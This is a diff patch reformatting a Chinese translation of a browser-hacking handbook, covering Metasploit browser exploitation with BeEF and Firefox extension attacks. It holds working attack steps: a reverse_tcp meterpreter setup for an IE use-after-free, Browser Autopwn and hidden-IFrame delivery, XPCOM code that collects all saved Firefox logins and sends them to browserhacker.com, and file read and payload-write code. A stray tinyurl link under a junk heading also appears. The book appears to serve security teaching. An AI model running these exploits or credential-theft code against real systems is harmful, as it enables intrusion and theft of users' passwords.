 
 ```
 set payload windows/meterpreter/reverse_tcp
@@ -7270,9 +7300,9 @@ Payload options (windows/meterpreter/reverse_tcp):
    LPORT     4444             yes       The listen port
 ```
 
--   选择 meterpreter reverse TCP shell 后，会出现三个新选项：EXITFUNC、LHOST 和 LPORT。EXITFUNC 有多种可能性，可以在当前应用程序中 spawn 一个新线程、spawn 一个新进程，或通过错误处理调用自身。选择哪种 EXITFUNC 取决于是否会导致应用程序崩溃。通常使用默认值是最佳选择。
+选择 meterpreter reverse TCP shell 后，会出现三个新选项：`EXITFUNC`、`LHOST` 和 `LPORT`。`EXITFUNC` 有多种可能性，可以在当前应用程序中 spawn 一个新线程、spawn 一个新进程，或通过错误处理调用自身。选择哪种 `EXITFUNC` 取决于是否会导致应用程序崩溃。通常使用默认值是最佳选择。
 
--   对于 LHOST，输入您的 IP 地址。LPORT 应为 Internet 上大多数主机可访问的端口，例如 443（如果不确定连接情况），或选择您自定义的随机端口（如果没有端口被阻塞）：
+对于 `LHOST`，输入您的 IP 地址。`LPORT` 应为 Internet 上大多数主机可访问的端口，例如 443（如果不确定连接情况），或选择您自定义的随机端口（如果没有端口被阻塞）：
 
 ```
 msf exploit(ie_cgenericelement_uaf) > set LHOST browserhacker.com
@@ -7288,9 +7318,9 @@ msf exploit(ie_cgenericelement_uaf ) > exploit
 [*] Server started.
 ```
 
--   服务器现在正在运行并等待连接。最后一步是使用 BeEF 将浏览器指向 exploit。在 BeEF 中有多种方式实现，但最有效的方式之一是启动隐藏的 IFrame 以防失败。为此，在 Online Browsers 窗格中高亮浏览器，进入 Commands 标签页下的 “Misc” 文件夹，选择 “Create Invisible IFrame” 模块。输入 Metasploit 服务器的 URL（本例为 http://browserhacker.com:80/single），然后点击右下角的 Execute 按钮，IFrame 将在 hooked 浏览器中创建，如图 6-32 所示。
+服务器现在正在运行并等待连接。最后一步是使用 BeEF 将浏览器指向 exploit。在 BeEF 中有多种方式实现，但最有效的方式之一是启动隐藏的 IFrame 以防失败。为此，在 Online Browsers 窗格中高亮浏览器，进入 Commands 标签页下的 “Misc” 文件夹，选择 “Create Invisible IFrame” 模块。输入 Metasploit 服务器的 URL（本例为 `http://browserhacker.com:80/single`），然后点击右下角的 Execute 按钮，IFrame 将在 hooked 浏览器中创建，如图 6-32 所示。
 
--   执行后几秒钟，BeEF 控制台会显示：
+执行后几秒钟，BeEF 控制台会显示：
 
 ```
 [19:37:20][*] Hooked browser [id:1, ip:192.168.1.16] 
@@ -7301,7 +7331,7 @@ msf exploit(ie_cgenericelement_uaf ) > exploit
    name:'Create Invisible Iframe']
 ```
 
--   在 Metasploit 控制台中，可以看到 exploit 加载并向 Windows XP 主机发送，最终弹出一个 shell。可以使用 sysinfo 命令获取目标计算机的更多信息：
+在 Metasploit 控制台中，可以看到 exploit 加载并向 Windows XP 主机发送，最终弹出一个 shell。可以使用 `sysinfo` 命令获取目标计算机的更多信息：
 
 ```
 [*] 192.168.1.16     ie_cgenericelement_uaf - Requesting: /single
@@ -7319,13 +7349,13 @@ System Language : en_US
 Meterpreter     : x86/win32
 ```
 
--   现在您已在受害系统上打开 shell，除非浏览器崩溃，否则网页仍应保持在 BeEF 中，从而为后续操作（如重新利用系统）提供机会。现在您已通过浏览器利用系统，可以在 Metasploit 中执行任何后期任务，包括提权、针对内部系统的攻击，或创建持久 backdoor，以便在机器重启后仍能重新连接。
+现在您已在受害系统上打开 shell，除非浏览器崩溃，否则网页仍应保持在 BeEF 中，从而为后续操作（如重新利用系统）提供机会。现在您已通过浏览器利用系统，可以在 Metasploit 中执行任何后期任务，包括提权、针对内部系统的攻击，或创建持久 backdoor，以便在机器重启后仍能重新连接。
 
 ## 使用 Browser Autopwn
 
 有时很难找到能在浏览器上有效的正确 exploit。此时，可能需要抛弃细微差别，使用一系列快速交付的 exploit。Metasploit 的 Browser Autopwn 正是为此设计的。Browser Autopwn 是 Metasploit 的一个 meta-module，它会 rapid succession 地启动许多模块。它为不同的 URL 绑定模块，然后提供一个中央 URL，您可以将浏览器指向该 URL 以启动对目标的 exploit。
 
-要启动 Autopwn，需要配置几个信息。第一是您希望 listener 和 URI 绑定的位置，即您将向目标发送的 URL。其次，需要设置 LHOST 选项，即反向 shell 的监听主机：
+要启动 Autopwn，需要配置几个信息。第一是您希望 listener 和 URI 绑定的位置，即您将向目标发送的 URL。其次，需要设置 `LHOST` 选项，即反向 shell 的监听主机：
 
 ```
 use auxiliary/server/browser_autopwn 
@@ -7335,12 +7365,9 @@ set URIPATH /
 exploit
 ```
 
+Metasploit 命令集会选择 `Browser Autopwn` 辅助模块，设置 `LHOST`，并设置服务器端口以及 URI。此情况下，最终目标 URL 为 `http://browserhacker.com`，当用户访问该 URL 时，会依次重定向到已启动的每个漏洞利用。通过将用户一个一个重定向到不同的漏洞服务器，实现此目标。用户到达漏洞服务器后，漏洞即被交付；若成功，则会创建一个 shell。不同的漏洞依次执行，直至所有漏洞均被测试完毕。
 
-
-
--   [Metasploit 命令集会选择 `Browser Autopwn` 辅助模块，设置 `LHOST`，并设置服务器端口以及 URI。此情况下，最终目标 URL 为 `http://browserhacker.com`，当用户访问该 URL 时，会依次重定向到已启动的每个漏洞利用。通过将用户一个一个重定向到不同的漏洞服务器，实现此目标。用户到达漏洞服务器后，漏洞即被交付；若成功，则会创建一个 shell。不同的漏洞依次执行，直至所有漏洞均被测试完毕。
-
--   当你输入 `exploit` 并按回车时，你会发现 `Metasploit` 需要一段时间来初始化。`Metasploit` 创建所有不同漏洞服务器所需的时间较长，通常需要五到十分钟才能启动全部模块。在系统提示服务器已就绪之前，向 Autopwn 发送请求只会在客户端出现错误。以下消息会在 Autopwn 就绪时显示：
+当你输入 `exploit` 并按回车时，你会发现 `Metasploit` 需要一段时间来初始化。`Metasploit` 创建所有不同漏洞服务器所需的时间较长，通常需要五到十分钟才能启动全部模块。在系统提示服务器已就绪之前，向 Autopwn 发送请求只会在客户端出现错误。以下消息会在 Autopwn 就绪时显示：
 
 ```
 [*] --- Done, found 57 exploit modules
@@ -7350,13 +7377,13 @@ exploit
 [*] Server started.
 ```
 
--   由于 Autopwn 启动时间较长，建议在利用过程早期启动它，然后将其作为备用漏洞技术。这样在你准备使用时，它已经加载完毕。它可以用于多种浏览器，因此一次性启动这些监听器可以在发现浏览器后立即将其指向 Autopwn 服务器，从而提高保持目标会话（保持目标在线）的机会。
+由于 Autopwn 启动时间较长，建议在利用过程早期启动它，然后将其作为备用漏洞技术。这样在你准备使用时，它已经加载完毕。它可以用于多种浏览器，因此一次性启动这些监听器可以在发现浏览器后立即将其指向 Autopwn 服务器，从而提高保持目标会话（保持目标在线）的机会。
 
 ## 使用 BeEF 与 Metasploit
 
--   将 BeEF 与 Metasploit 集成后，你可以在 BeEF 内直接调用 Metasploit 模块，对浏览器进行指纹识别并获取更多信息，然后再尝试利用。有时利用失败、浏览器崩溃，导致你失去对已目标化的浏览器的控制。此时，拥有更强的浏览器控制能力是有益的。BeEF 通过在内部直接调用 Metasploit 模块实现这一点。
+将 BeEF 与 Metasploit 集成后，你可以在 BeEF 内直接调用 Metasploit 模块，对浏览器进行指纹识别并获取更多信息，然后再尝试利用。有时利用失败、浏览器崩溃，导致你失去对已目标化的浏览器的控制。此时，拥有更强的浏览器控制能力是有益的。BeEF 通过在内部直接调用 Metasploit 模块实现这一点。
 
--   要在 BeEF 中启用 Metasploit，请编辑 BeEF 主目录下的 `config.yaml` 文件，并将以下内容设置为 true：
+要在 BeEF 中启用 Metasploit，请编辑 BeEF 主目录下的 `config.yaml` 文件，并将以下内容设置为 true：
 
 ```
 extension:
@@ -7369,7 +7396,7 @@ extension:
     social_engineering: true
 ```
 
--   你可以在 `extensions/metasploit/config.yaml` 中找到更多配置选项。该文件包含连接 Metasploit 的设置，如主机、用户名和密码，若在网络环境下使用这些配置时需要全部更新。下面是可能的配置变量列表：
+你可以在 `extensions/metasploit/config.yaml` 中找到更多配置选项。该文件包含连接 Metasploit 的设置，如主机、用户名和密码，若在网络环境下使用这些配置时需要全部更新。下面是可能的配置变量列表：
 
 ```
 beef:
@@ -7391,7 +7418,7 @@ beef:
             auto_msfrpcd_timeout: 120
 ```
 
--   接下来，使用 `msfconsole` 启动 Metasploit。加载后，在 Metasploit 中启动 MSGRPC 接口。MSGRPC 接口允许外部应用发出远程命令，也是 Metasploit 与 BeEF 相互交互的方式。在 `msfconsole` 中执行以下命令加载接口：
+接下来，使用 `msfconsole` 启动 Metasploit。加载后，在 Metasploit 中启动 MSGRPC 接口。MSGRPC 接口允许外部应用发出远程命令，也是 Metasploit 与 BeEF 相互交互的方式。在 `msfconsole` 中执行以下命令加载接口：
 
 ```
 msf > load msgrpc Pass=abc123
@@ -7401,9 +7428,9 @@ msf > load msgrpc Pass=abc123
 [*] Successfully loaded plugin: msgrpc
 ```
 
--   在此示例中，只需提供密码。不过，其他变量也可设置。`ServerHost` 与 `ServerPort` 设置 MSGRPC 服务器监听的 IP 和端口；`User` 与 `Pass` 设置登录用户名和密码；`URI` 可设置为不同的 MSGRPC 端点，以使服务器更难被发现。
+在此示例中，只需提供密码。不过，其他变量也可设置。`ServerHost` 与 `ServerPort` 设置 MSGRPC 服务器监听的 IP 和端口；`User` 与 `Pass` 设置登录用户名和密码；`URI` 可设置为不同的 MSGRPC 端点，以使服务器更难被发现。
 
--   加载 MSGRPC 后，在命令行启动 BeEF，控制台会显示类似以下内容，表明 Metasploit 已成功加载：
+加载 MSGRPC 后，在命令行启动 BeEF，控制台会显示类似以下内容，表明 Metasploit 已成功加载：
 
 ```
 [ 0:20:32][*] Successful connection with Metasploit.
@@ -7413,45 +7440,43 @@ msf > load msgrpc Pass=abc123
 [ 0:20:35][*] 410 modules enabled.
 ```
 
--   当 BeEF 成功连接到 Metasploit 服务器后，BeEF 能够自行执行 Metasploit 命令。这样可以在 BeEF 内远程管理漏洞服务器，只需进行 shell 操作即可。要在 BeEF 中执行漏洞，请在 BeEF 命令窗口的 “Metasploit” 标签页中选择已钩住的浏览器，然后进入 Metasploit 命令列表。该标签页包含已从 Metasploit 加载的所有漏洞，并会尽力提供每个漏洞的流量灯（traffic light）推荐。由于 BeEF 专注于浏览器，仅会显示浏览器相关的 Metasploit 模块。
+当 BeEF 成功连接到 Metasploit 服务器后，BeEF 能够自行执行 Metasploit 命令。这样可以在 BeEF 内远程管理漏洞服务器，只需进行 shell 操作即可。要在 BeEF 中执行漏洞，请在 BeEF 命令窗口的 “Metasploit” 标签页中选择已钩住的浏览器，然后进入 Metasploit 命令列表。该标签页包含已从 Metasploit 加载的所有漏洞，并会尽力提供每个漏洞的流量灯（traffic light）推荐。由于 BeEF 专注于浏览器，仅会显示浏览器相关的 Metasploit 模块。
 
--   例如，你可以选择 `MS13-038` —  — Microsoft Internet Explorer `CGenericElement` 对象使用后免费漏洞模块。随后输入监听端口、 `URIPATH`、Payload 及其信息，然后点击执行按钮（如图 6-33 所示）。BeEF 会将请求转发给 Metasploit，以便使用 MSGRPC 启动监听器。
+例如，你可以选择 `MS13-038` — — Microsoft Internet Explorer `CGenericElement` 对象使用后免费漏洞模块。随后输入监听端口、 `URIPATH`、Payload 及其信息，然后点击执行按钮（如图 6-33 所示）。BeEF 会将请求转发给 Metasploit，以便使用 MSGRPC 启动监听器。
 
- start figure 
+start figure
 
 **Figure 6-33:** 使用 BeEF 通过 Metasploit 目标化 MS13-038
 
 ![c06f033.tif](img/c06f033.png)
 
- end figure 
+end figure
 
--   经过几秒钟处理后，BeEF 会创建一个隐藏的 IFrame 并将浏览器导向生成的 URL。此后，Metasploit 完成其余的利用过程。若利用成功，Metasploit 控制台会显示新建立的 shell（如图 6-34 所示）。此方法适用于大多数浏览器相关的 Metasploit 模块。
+经过几秒钟处理后，BeEF 会创建一个隐藏的 IFrame 并将浏览器导向生成的 URL。此后，Metasploit 完成其余的利用过程。若利用成功，Metasploit 控制台会显示新建立的 shell（如图 6-34 所示）。此方法适用于大多数浏览器相关的 Metasploit 模块。
 
- start figure 
+start figure
 
 **Figure 6-34:** 结果会话（Meterpreter session）
 
 ![c06f034.tif](img/c06f034.png)
 
- end figure 
+end figure
 
--   虽然可以在 BeEF 内启动 Browser Autopwn，但其启动时间较长，可能不如外部直接启动来得及时。因此，你可以使用隐藏的 IFrame 将浏览器指向已启动的 Autopwn 实例。基于此，建议在利用过程中尽早加载 Autopwn，以便在需要时随时可用。不过，请记住，针对性攻击相比于 Autopwn 模块，成功率更高且被检测的可能性更低。
+虽然可以在 BeEF 内启动 Browser Autopwn，但其启动时间较长，可能不如外部直接启动来得及时。因此，你可以使用隐藏的 IFrame 将浏览器指向已启动的 Autopwn 实例。基于此，建议在利用过程中尽早加载 Autopwn，以便在需要时随时可用。不过，请记住，针对性攻击相比于 Autopwn 模块，成功率更高且被检测的可能性更低。
 
 # Summary
 
--   在本章中，你探索了多种方式来指纹识别、攻击和利用浏览器。从确定浏览器的操作系统、版本和语言，到窃取会话 Cookie，浏览器都是滥用的重要目标。
+在本章中，你探索了多种方式来指纹识别、攻击和利用浏览器。从确定浏览器的操作系统、版本和语言，到窃取会话 Cookie，浏览器都是滥用的重要目标。
 
--   精准定位操作系统、浏览器版本等细节，使你能够针对特定浏览器及其功能进行攻击。一旦完成浏览器指纹识别，你就处于更有利的位置来发起攻击。
+精准定位操作系统、浏览器版本等细节，使你能够针对特定浏览器及其功能进行攻击。一旦完成浏览器指纹识别，你就处于更有利的位置来发起攻击。
 
--   本章展示了 JavaScript 加密的缺陷，以及绕过公共实现的若干技术。你可以将这些可移植的方法应用于后续遇到的其他 JavaScript 加密实现，以展示相似的安全问题。
-
+本章展示了 JavaScript 加密的缺陷，以及绕过公共实现的若干技术。你可以将这些可移植的方法应用于后续遇到的其他 JavaScript 加密实现，以展示相似的安全问题。
 
 
 
 # 1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1
+
 tinyurl.com/xxxtrapple2021
-
-
 
 25. Ravishankar Borgaonkar. (2013). USSD 代码在移动网络中的错误使用。2013 年 7 月 10 日检索自 [`https://www.troopers.de/wp-content/uploads/2012/12/TROOPERS13-Dirty_use_of_USSD_codes_in_cellular-Ravi_Borgaonkor.pdf`](https://www.troopers.de/wp-content/uploads/2012/12/TROOPERS13-Dirty_use_of_USSD_codes_in_cellular-Ravi_Borgaonkor.pdf)
 
@@ -7483,11 +7508,9 @@ tinyurl.com/xxxtrapple2021
 
 39. CVE. (2013). CVE-2013-0753。2013 年 8 月 12 日检索自 [`http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0753`](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0753)
 
-40. Mozilla. (2013). 814001—(CVE-2013-0753) [FIX] XMLSerializer Use-After-Free Remote Code Execution Vulnerability (ZDI-CAN-1608)。2013 年 8 月 12 日检索自 [`https://bugzilla.mozilla.org/show_bug.cgi?id=814001`](https://bugzilla.mozilla.org/show_bug.cgi?id=814001)
+40. Mozilla. (2013). 814001—(CVE-2013-0753) [FIX] `XMLSerializer` Use-After-Free Remote Code Execution Vulnerability (ZDI-CAN-1608)。2013 年 8 月 12 日检索自 [`https://bugzilla.mozilla.org/show_bug.cgi?id=814001`](https://bugzilla.mozilla.org/show_bug.cgi?id=814001)
 
-# Chapter 7
-
-# 攻击扩展
+# Chapter 7 攻击扩展
 
 在上一章中，你探索了直接攻击浏览器。本章进一步沿着功能链向前，展示如何攻击浏览器扩展。
 
@@ -7499,7 +7522,7 @@ tinyurl.com/xxxtrapple2021
 
 重要的是，扩展会与加载的网页交互，并创建易于利用的攻击路径。本章通过利用 Firefox 和 Chrome 扩展中的漏洞，探讨这些攻击路径。
 
-# 理解扩展解剖结构
+## 理解扩展解剖结构
 
 让我们探索扩展是什么以及它们如何因浏览器而异。如果你对扩展在浏览器生态系统中的作用有充分了解，可以直接跳到本章更活跃的攻击部分。
 
@@ -7513,16 +7536,13 @@ tinyurl.com/xxxtrapple2021
 
 扩展可以跨越浏览器加载的所有页面。例如，NoScript 扩展可能影响浏览器加载的每一页。其他扩展也可能如此。将扩展视为在每个加载的页面中运行的虚拟 Web 应用是有帮助的，这在本章后续的漏洞发现部分将被进一步探讨。
 
-## 扩展与插件的区别
+### 扩展与插件的区别
 
 扩展和插件有时难以区分，但它们存在一些主要区别。扩展位于浏览器的进程空间内，而插件可以独立运行。扩展可以创建浏览器菜单和标签页，而插件不能。
 
-
-
-
 与扩展不同，插件仅影响其加载的页面，这意味着它不会自动包含在任何网页中。插件的加载可以通过两种方式实现。第一种是服务器返回特定的 MIME 类型。例如，Adobe Reader 可能会在浏览器中显示 PDF，对应的内容类型为 `application/pdf`。第二种方式是使用 `<object>` 标签（或 `<embed>` 标签），这同样会影响加载它的页面。你将在下一章深入探讨插件的攻击方法。
 
-## 扩展与附加组件的区别
+### 扩展与附加组件的区别
 
 “附加组件”一词可能是浏览器术语中使用最为混淆的。它在行业内使用并不一致。可以将其视为浏览器增强的统称，涵盖插件、扩展等。
 
@@ -7530,11 +7550,11 @@ Google 通常使用“扩展”或“插件”，但对其可下载的 Google An
 
 总体而言，大多数情况下，附加组件指的是除浏览器本身和插件之外的所有项目。有了这些前提，我们不会讨论所有不同的附加组件。本章专门聚焦于扩展，按照 Mozilla 的定义以及其他浏览器厂商的相似定义。
 
-## 权限的探索
+### 权限的探索
 
 扩展的权限因浏览器和开发者而异，但在深入细节之前，可以先作一个简要的概括。每个浏览器厂商提供的扩展环境都拥有提升的浏览器功能访问权限。这点一致，也是扩展对终端用户有用的原因；同样，也是它们对攻击者有用的主要原因。
 
-要理解在目标浏览器扩展时的关键点是：它在特权上下文中运行。主要的两个区域分别是低特权的 Internet 区域和高特权的浏览器区域（也称为 chrome:// 区域）。在某些情况下，即使在扩展内部，组件的权限也会有所不同。Figure 7-1 展示了扩展的基本结构及其与浏览器和底层操作系统的关系。它可以访问提供超出普通网页功能的特权 API，这些功能包括访问敏感用户数据，以及在某些情况下执行操作系统命令。
+要理解在目标浏览器扩展时的关键点是：它在特权上下文中运行。主要的两个区域分别是低特权的 Internet 区域和高特权的浏览器区域（也称为 `chrome://` 区域）。在某些情况下，即使在扩展内部，组件的权限也会有所不同。Figure 7-1 展示了扩展的基本结构及其与浏览器和底层操作系统的关系。它可以访问提供超出普通网页功能的特权 API，这些功能包括访问敏感用户数据，以及在某些情况下执行操作系统命令。
 
 start figure 
 
@@ -7546,21 +7566,21 @@ end figure
 
 扩展通常拥有比实际需要的更多权限。这可能是因为浏览器架构不支持降低特权，也可能是开发者在安装时请求了过多权限。当然，权限越多，扩展作为攻击目标就越具吸引力。
 
-### 非特权 Internet 区域
+#### 非特权 Internet 区域
 
 Internet 区域是非特权的浏览器区域。你可能已经非常熟悉它的工作方式。它遵循同源策略（SOP），对敏感用户数据的访问受限，不能直接影响操作系统。
 
 Internet 区域是 JavaScript 在从 Web 应用返回时执行的非特权上下文。简言之，它是几乎所有 Web 应用代码执行的上下文。
 
-### 特权浏览器区域
+#### 特权浏览器区域
 
 扩展虽然在某种程度上像虚拟的 Web 应用，但它们不是通过 HTTP 或 HTTPS 传输的，而是运行在自己的 URI 方案中，由于同源策略的限制，普通网站或本地文件无法访问该方案。
 
-特权浏览器区域（也称为 chrome:// 区域）是扩展代码执行的地方。它是浏览器内部高度受信任的区域。chrome:// 区域可以访问敏感用户信息和特权 API，并且不受同源策略限制。
+特权浏览器区域（也称为 `chrome://` 区域）是扩展代码执行的地方。它是浏览器内部高度受信任的区域。`chrome://` 区域可以访问敏感用户信息和特权 API，并且不受同源策略限制。
 
-浏览器的 chrome:// 并不等同于 Google Chrome 浏览器。术语在浏览器领域是多义的，但通常有足够的上下文可以判断指的是哪个概念。
+浏览器的 `chrome://` 并不等同于 Google Chrome 浏览器。术语在浏览器领域是多义的，但通常有足够的上下文可以判断指的是哪个概念。
 
-为了避免混淆，本书在讨论特权上下文时统一使用 chrome:// 方案。
+为了避免混淆，本书在讨论特权上下文时统一使用 `chrome://` 方案。
 
 ## 理解 Firefox 扩展
 
@@ -7580,7 +7600,7 @@ end figure
 
 ### 查看源码
 
-Firefox 扩展的文件结构使用 zip 格式压缩。它不使用传统的 .zip 文件名后缀（我们不会使用“文件名后缀”以免混淆），而是使用 .xpi（发音为“zippy”）作为后缀。
+Firefox 扩展的文件结构使用 zip 格式压缩。它不使用传统的 .zip 文件名后缀（我们不会使用“文件名后缀”以免混淆），而是使用 `.xpi`（发音为“zippy”）作为后缀。
 
 这意味着你已经熟悉解压 Firefox 扩展的过程，因此无需学习新的获取源码的方法。你只需使用喜欢的解压程序即可查看目标 Firefox 扩展的目录结构。
 
@@ -7590,21 +7610,21 @@ start feature
 
 **Firefox Extension Directory Structure** Firefox 扩展遵循非常相似的结构，各目录有明确的用途。目录结构通常如下：
 
-*   Chrome 包含进一步的子目录
+* `Chrome` 包含进一步的子目录
+* `Content` 包含主要功能
+* `Skin` 包含图片和 CSS
+* `Defaults` 包含偏好设置
+* `Components` 包含 XPCOM 组件（如需要）
 
-*   Content 包含主要功能
+`Content` 目录很可能是你感兴趣的重点，它通常包含主扩展 JavaScript，以及在某些情况下的二进制库。Figure 7-3 展示了 FirePHP 扩展的文件结构。此示例未展示扩展可以包含的所有元素。在此例中，扩展开发者未使用 `Components` 目录。
 
-*   Skin 包含图片和 CSS
-
-*   Defaults 包含偏好设置
-
-*   Components 包含 XPCOM 组件（如需要）
-
-Content 目录很可能是你感兴趣的重点，它通常包含主扩展 JavaScript，以及在某些情况下的二进制库。Figure 7-3 展示了 FirePHP 扩展的文件结构。此示例未展示扩展可以包含的所有元素。在此例中，扩展开发者未使用 Components 目录。start figure  
+start figure  
 
 **Figure 7-3:** FirePHP 扩展的目录结构
 
-![c07f003.tif](img/c07f003.png) end figure  
+![c07f003.tif](img/c07f003.png)
+
+end figure  
 
 * * *
 
@@ -7612,34 +7632,29 @@ end feature
 
 #### 解释更新过程
 
-可能感兴趣的文件是 install.rdf，它不仅包含安装信息，还包含更新过程的细节。与更新相关的（非强制）参数是 updateURL 和 updateKey。
+可能感兴趣的文件是 `install.rdf`，它不仅包含安装信息，还包含更新过程的细节。与更新相关的（非强制）参数是 `updateURL` 和 `updateKey`。
 
-updateURL 和 updateKey 的存在与否表明 Firefox 如何管理扩展的更新。如果两者都不存在，则扩展的更新完全由 Mozilla add-ons 管理，你只有有限的攻击面可以针对更新过程。如果指定了 updateKey，或 updateURL 使用 HTTPS 方案，你的攻击面也会受到限制。
+`updateURL` 和 `updateKey` 的存在与否表明 Firefox 如何管理扩展的更新。如果两者都不存在，则扩展的更新完全由 Mozilla add-ons 管理，你只有有限的攻击面可以针对更新过程。如果指定了 `updateKey`，或 `updateURL` 使用 HTTPS 方案，你的攻击面也会受到限制。
 
+如果在 `install.rdf` 文件中包含 `updateKey` 参数，它将包含一个公钥。此时，必须使用对应的私钥签名从指定的 `updateURL` 传递的所有更新。在这种情况下，Firefox 会验证所有更新的完整性，从而阻止您干扰更新过程。
 
-
-
-如果在 install.rdf 文件中包含 updateKey 参数，它将包含一个公钥。此时，必须使用对应的私钥签名从指定的 updateURL 传递的所有更新。在这种情况下，Firefox 会验证所有更新的完整性，从而阻止您干扰更新过程。
-
-在一个场景中，install.rdf 文件包含 HTTP updateURL，且 updateKey 被省略，存在安全问题。这意味着没有任何更新的完整性被验证，并且它们通过明文通道传递。当 Firefox 启动时，它会连接到 updateURL 并请求 update.rdf，其中包含版本信息，Firefox 将使用该信息决定是否需要更新。
+在一个场景中，`install.rdf` 文件包含 HTTP `updateURL`，且 `updateKey` 被省略，存在安全问题。这意味着没有任何更新的完整性被验证，并且它们通过明文通道传递。当 Firefox 启动时，它会连接到 `updateURL` 并请求 `update.rdf`，其中包含版本信息，Firefox 将使用该信息决定是否需要更新。
 
 如前面章节所示，可以使用中间技术控制明文通信通道。一旦您对该更新通道拥有控制权，交付自己构建的更新过程就变得微不足道。
 
 ### 理解 XUL 和 XBL
 
+
+
 XML 用户界面语言（XUL）是一种在 Firefox 浏览器的外观（chrome）中表达可视内容的方式。但仅此而已！当按下键盘或点击鼠标时不会发生任何操作。这时 XML 绑定语言（XBL）就派上用场。它将可视内容与 JavaScript 结合，为您点击按钮时所期待的所有功能提供支持。
 
-令人惊讶的是，Firefox 浏览器本身也是用 XUL 编写的，您可以通过在地址栏中输入 chrome:// URL 来看到这一点。如果您在浏览器中输入 chrome://browser/content/browser.xul，您将看到图 7-4 中的界面。
-
-start figure 
+令人惊讶的是，Firefox 浏览器本身也是用 XUL 编写的，您可以通过在地址栏中输入 `chrome://` URL 来看到这一点。如果您在浏览器中输入 `chrome://browser/content/browser.xul`，您将看到图 7-4 中的界面。
 
 **Figure 7-4:** Firefox chrome:// 示例
 
 ![c07f004.tif](img/c07f004.png)
 
-end figure 
-
-图 7-4 显示 Firefox 浏览器加载 chrome://browser/content/browser.xul 的 URL。加载的内容也是功能性的，因为 XUL 与 XBL 相结合。您可以看到，在第二个地址栏中输入相同的 URL，会创建第三种浏览器外观呈现。
+图 7-4 显示 Firefox 浏览器加载 `chrome://browser/content/browser.xul` 的 URL。加载的内容也是功能性的，因为 XUL 与 XBL 相结合。您可以看到，在第二个地址栏中输入相同的 URL，会创建第三种浏览器外观呈现。
 
 关于 XUL 和 XBL 的这些描述比较简化，但它们提供了简要背景，因为此类攻击在理论上是主要存在的。因此，它们不会直接被检查，但下面章节中涵盖的许多细节同样适用于利用这些技术的漏洞。
 
@@ -7647,7 +7662,7 @@ end figure
 
 跨平台组件对象模型（XPCOM）API 为浏览器扩展提供了额外功能。XPCOM 是浏览器使用的跨平台组件模型。如果您熟悉 Microsoft COM，将 XPCOM 视为 Mozilla 自己的版本会很有帮助。
 
-扩展中的 JavaScript 需要一种方式来访问 XPCOM。这就是 XPConnect 的作用，它促进了 XPCOM 与 JavaScript 之间的通信。它提供了一个透明层，使您能够使用 JavaScript 调用 XPCOM 中的函数。基本上，它就是您在 chrome:// 区域内调用 XPCOM API 的手段。
+扩展中的 JavaScript 需要一种方式来访问 XPCOM。这就是 XPConnect 的作用，它促进了 XPCOM 与 JavaScript 之间的通信。它提供了一个透明层，使您能够使用 JavaScript 调用 XPCOM 中的函数。基本上，它就是您在 `chrome://` 区域内调用 XPCOM API 的手段。
 
 得益于 Nick Freeman 和 Roberto Suggi Liverani 的研究，好消息是扩展可以使用在操作系统上下文中运行的 XPCOM 组件。让我们深入研究他们的研究成果以及 XPCOM 所能让您执行的操作。
 
@@ -7655,7 +7670,7 @@ end figure
 
 Firefox 与所有网络浏览器一样，提供了存储用户在访问的 Web 应用中用户名和密码的方法。这些敏感信息也可通过 XPCOM API 访问。这意味着从扩展可以查询登录管理器。
 
-nsILoginManager 接口用于操作 Firefox 内的密码管理器功能。该接口提供添加、删除、修改和查看存储凭据的方法。该 API 所提供的功能包括具有明显用途的 getAllLogins() 方法：
+`nsILoginManager` 接口用于操作 Firefox 内的密码管理器功能。该接口提供添加、删除、修改和查看存储凭据的方法。该 API 所提供的功能包括具有明显用途的 `getAllLogins()` 方法：
 
 ```
 // Get the login manager object
@@ -7676,32 +7691,28 @@ for (i=0;i<=allCredentials.length;i=i+1){
 }
 ```
 
-这段代码演示了如何从 Firefox 登录管理器中提取所有内容。它会向 http://browserhacker.com 发送包含凭据的 HTTP 请求。图 7-5 是一张截图，展示了这可能在 Apache 日志中的样子。
-
-start figure 
+这段代码演示了如何从 Firefox 登录管理器中提取所有内容。它会向 `http://browserhacker.com` 发送包含凭据的 HTTP 请求。图 7-5 是一张截图，展示了这可能在 Apache 日志中的样子。
 
 **Figure 7-5:** 被盗凭据的 Apache 日志
 
 ![c07f005.tif](img/c07f005.png)
 
-end figure 
-
 #### 从文件系统读取
 
-SOP 不适用于扩展中的 URL。在特权 chrome:// 区域内的指令几乎不受限制，可以访问任意来源。file:// 协议变得非常有用。
+SOP 不适用于扩展中的 URL。在特权 `chrome://` 区域内的指令几乎不受限制，可以访问任意来源。`file://` 协议变得非常有用。
 
-您可以使用 document.ReadURL.readFile 方法在 chrome:// 区域内读取文件系统中的任意文件：
+您可以使用 `document.ReadURL.readFile` 方法在 `chrome://` 区域内读取文件系统中的任意文件：
 
 ```
 var fileToRead="file:///C:/boot.ini";
 var fileContents=document.ReadURL.readFile(fileToRead);
 ```
 
-在扩展的特权上下文中，上述代码会读取 c:\\boot.ini 文件。
+在扩展的特权上下文中，上述代码会读取 `c:\\boot.ini` 文件。
 
 #### 向文件系统写入
 
-Firefox 用于向文件系统写入的 XPCOM API 名为 nsIFileOutputStream。与前面讨论的本地文件访问类似，该接口允许浏览器向浏览器有权访问的文件系统的任何位置写入。
+Firefox 用于向文件系统写入的 XPCOM API 名为 `nsIFileOutputStream`。与前面讨论的本地文件访问类似，该接口允许浏览器向浏览器有权访问的文件系统的任何位置写入。
 
 使用此 XPCOM API 可以在攻击期间提供更大的灵活性。例如，它可用于部署 Metasploit Meterpreter 等负载或您选择的任何远程访问工具：
 
@@ -7731,40 +7742,31 @@ function makeFile(bdata){
 }
 ```
 
-makeFile() 方法使用 XPCOM 在（Windows）文件系统中写入文件。它需要 chrome:// 区域的特权才能成功执行。
+`makeFile()` 方法使用 XPCOM 在（Windows）文件系统中写入文件。它需要 `chrome://` 区域的特权才能成功执行。
 
 #### 执行操作系统命令
 
 显然，您想知道如何在目标操作系统上执行程序。这就是您将获得连接并运行负载的方式。XPCOM 也提供了实现此功能的方法！
 
-nsIProcess 代表 Mozilla 环境中的可执行进程。您可以从 Firefox 扩展中使用它来执行目标文件系统上的程序。以下代码演示了如何使用 Netcat 在 Linux 操作系统上执行一个反向 shell：
